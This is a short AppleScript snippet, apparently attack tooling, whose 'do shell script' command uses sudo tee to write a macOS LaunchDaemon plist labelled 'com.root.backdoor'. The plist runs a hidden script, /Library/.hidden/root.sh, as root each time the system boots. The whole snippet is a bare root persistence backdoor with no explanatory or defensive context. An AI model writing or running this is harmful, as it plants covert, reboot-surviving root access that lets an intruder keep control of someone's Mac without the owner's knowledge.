do shell script "echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
  <key>Label</key>
  <string>com.root.backdoor</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>/Library/.hidden/root.sh</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.root.backdoor.plist"
